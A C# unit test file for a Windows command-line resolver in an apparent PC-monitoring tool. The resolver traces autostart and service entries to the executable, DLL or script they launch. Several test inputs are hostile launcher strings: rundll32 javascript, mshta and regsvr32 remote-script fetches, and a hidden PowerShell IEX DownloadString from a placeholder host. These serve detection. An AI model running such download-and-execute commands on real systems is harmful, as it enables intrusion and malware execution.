using PCMonitor.Core.Collectors;

namespace PCMonitor.Core.Tests;

public class CommandLineResolverTests
{
    private sealed class FakeProbe : IPathProbe
    {
        private readonly HashSet<string> _files = new(StringComparer.OrdinalIgnoreCase)
        {
            @"C:\Program Files\App\app.exe",
            @"C:\Windows\System32\rundll32.exe",
            @"C:\Windows\System32\regsvr32.exe",
            @"C:\Windows\System32\mshta.exe",
            @"C:\Windows\System32\cmd.exe",
            @"C:\Windows\System32\wscript.exe",
            @"C:\Windows\System32\conhost.exe",
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            @"C:\Windows\System32\shell32.dll",
            @"C:\Windows\System32\scrobj.dll",
            @"C:\Windows\System32\drivers\x.sys",
            @"C:\Windows\System32\drivers\y.sys",
            @"C:\Windows\tool.exe",
            @"C:\Users\u\AppData\Roaming\evil.dll",
            @"C:\Scripts\job.ps1",
            @"C:\Scripts\job.vbs",
            @"C:\Scripts\start.bat",
            @"C:\a b\x.exe",
        };

        public string SystemRoot => @"C:\Windows";

        public string Expand(string text) => text
            .Replace("%SystemRoot%", @"C:\Windows", StringComparison.OrdinalIgnoreCase)
            .Replace("%ProgramFiles%", @"C:\Program Files", StringComparison.OrdinalIgnoreCase);

        public bool FileExists(string path) => _files.Contains(path);

        public string? SearchPath(string name)
        {
            var candidates = name.Contains('.') ? new[] { name } : new[] { name + ".exe" };
            foreach (var directory in new[] { @"C:\Windows\System32", @"C:\Windows", @"C:\Windows\System32\WindowsPowerShell\v1.0" })
            {
                foreach (var candidate in candidates)
                {
                    var full = directory + @"\" + candidate;
                    if (_files.Contains(full)) return full;
                }
            }
            return null;
        }
    }

    private static readonly CommandLineResolver Resolver = new(new FakeProbe());

    [Theory]
    [InlineData(@"""C:\Program Files\App\app.exe"" --minimized")]
    [InlineData(@"C:\Program Files\App\app.exe /tray")]
    [InlineData(@"%ProgramFiles%\App\app.exe")]
    [InlineData(@"C:\Program Files\App\app")]
    public void 実行ファイルを直接起動する形を解ける(string command)
    {
        var resolved = Resolver.Resolve(command);
        Assert.Equal(@"C:\Program Files\App\app.exe", resolved.TargetPath);
        Assert.Null(resolved.ScriptHost);
        Assert.Null(resolved.UnresolvedReason);
    }

    [Theory]
    [InlineData(@"\SystemRoot\System32\drivers\x.sys", @"C:\Windows\System32\drivers\x.sys")]
    [InlineData(@"system32\drivers\y.sys", @"C:\Windows\system32\drivers\y.sys")]
    [InlineData(@"\??\C:\Windows\tool.exe", @"C:\Windows\tool.exe")]
    public void サービスの_ImagePath_の書き方を解ける(string command, string expected)
    {
        Assert.Equal(expected, Resolver.Resolve(command).TargetPath, ignoreCase: true);
    }

    [Fact]
    public void 引用符が二重に付いた登録を解ける()
    {
        var resolved = Resolver.Resolve(@"""""C:\a b\x.exe"""" -background");
        Assert.Equal(@"C:\a b\x.exe", resolved.TargetPath);
    }

    [Fact]
    public void 無くなったファイルは_推定のパスを返す()
    {
        var resolved = Resolver.Resolve(@"C:\Gone\gone.exe -x");
        Assert.Equal(@"C:\Gone\gone.exe", resolved.TargetPath);
    }

    [Fact]
    public void 見つからない名前は_理由を付けて解決できずにする()
    {
        var resolved = Resolver.Resolve("nosuchtool --flag");
        Assert.Null(resolved.TargetPath);
        Assert.NotNull(resolved.UnresolvedReason);
    }

    [Theory]
    [InlineData(@"rundll32.exe C:\Users\u\AppData\Roaming\evil.dll,Start")]
    [InlineData(@"C:\Windows\System32\rundll32.exe ""C:\Users\u\AppData\Roaming\evil.dll"",Start arg")]
    public void rundll32_は読み込む_DLL_までたどる(string command)
    {
        var resolved = Resolver.Resolve(command);
        Assert.Equal(@"C:\Users\u\AppData\Roaming\evil.dll", resolved.TargetPath);
        Assert.Equal("rundll32", resolved.ScriptHost);
        Assert.Equal(@"C:\Windows\System32\rundll32.exe", resolved.HostPath);
    }

    [Fact]
    public void rundll32_の名前だけの_DLL_は_System32_から探す()
    {
        var resolved = Resolver.Resolve("rundll32 shell32.dll,Control_RunDLL");
        Assert.Equal(@"C:\Windows\System32\shell32.dll", resolved.TargetPath);
    }

    [Theory]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";alert(1)", "rundll32")]
    [InlineData(@"mshta.exe http://example.invalid/a.hta", "mshta")]
    [InlineData(@"mshta vbscript:Execute(""x"")", "mshta")]
    [InlineData(@"regsvr32 /s /n /u /i:http://example.invalid/a.sct scrobj.dll", "regsvr32")]
    [InlineData(@"powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.invalid')""", "powershell")]
    [InlineData(@"cmd /c echo hi > C:\x.txt", "cmd")]
    public void その場に書かれた命令や_URL_は_ファイル無しとして返す(string command, string host)
    {
        var resolved = Resolver.Resolve(command);
        Assert.True(resolved.Inline);
        Assert.Null(resolved.TargetPath);
        Assert.Equal(host, resolved.ScriptHost);
    }

    [Theory]
    [InlineData("powershell.exe -enc SQBFAFgA")]
    [InlineData("powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA")]
    [InlineData("powershell -ec SQBFAFgA")]
    public void powershell_のエンコードされた命令を見分ける(string command)
    {
        var resolved = Resolver.Resolve(command);
        Assert.True(resolved.Encoded);
        Assert.True(resolved.Inline);
    }

    [Theory]
    [InlineData(@"powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\job.ps1 -Arg 1")]
    [InlineData(@"powershell -ep bypass -nop -f ""C:\Scripts\job.ps1""")]
    [InlineData(@"powershell -Command ""& 'C:\Scripts\job.ps1' -Quiet""")]
    [InlineData(@"powershell C:\Scripts\job.ps1")]
    public void powershell_はスクリプトのファイルまでたどる(string command)
    {
        var resolved = Resolver.Resolve(command);
        Assert.Equal(@"C:\Scripts\job.ps1", resolved.TargetPath);
        Assert.Equal("powershell", resolved.ScriptHost);
        Assert.False(resolved.Encoded);
    }

    [Theory]
    [InlineData(@"cmd /c start """" ""C:\a b\x.exe"" -quiet")]
    [InlineData(@"cmd.exe /d /c ""C:\a b\x.exe""")]
    [InlineData(@"cmd /c """"C:\a b\x.exe"" -quiet""")]
    public void cmd_は中のコマンドまでたどる(string command)
    {
        var resolved = Resolver.Resolve(command);
        Assert.Equal(@"C:\a b\x.exe", resolved.TargetPath);
        Assert.Equal("cmd", resolved.ScriptHost);
    }

    [Fact]
    public void wscript_はスクリプトのファイルまでたどる()
    {
        var resolved = Resolver.Resolve(@"wscript.exe //B //Nologo C:\Scripts\job.vbs arg");
        Assert.Equal(@"C:\Scripts\job.vbs", resolved.TargetPath);
        Assert.Equal("wscript", resolved.ScriptHost);
    }

    [Fact]
    public void バッチ_ファイルの直接の登録は_cmd_経由として扱う()
    {
        var resolved = Resolver.Resolve(@"C:\Scripts\start.bat");
        Assert.Equal(@"C:\Scripts\start.bat", resolved.TargetPath);
        Assert.Equal("cmd", resolved.ScriptHost);
    }

    [Fact]
    public void conhost_の_headless_は中のコマンドまでたどる()
    {
        var resolved = Resolver.Resolve(@"conhost.exe --headless powershell -enc SQBFAFgA");
        Assert.True(resolved.Encoded);
        Assert.Equal(@"C:\Windows\System32\conhost.exe", resolved.HostPath);
    }

    [Fact]
    public void 引数の区切りは引用符をまとめる()
    {
        Assert.Equal(new[] { "/s", @"C:\a b\x.dll", "last" },
            CommandLineResolver.Tokenize(@"/s ""C:\a b\x.dll""   last"));
    }
}
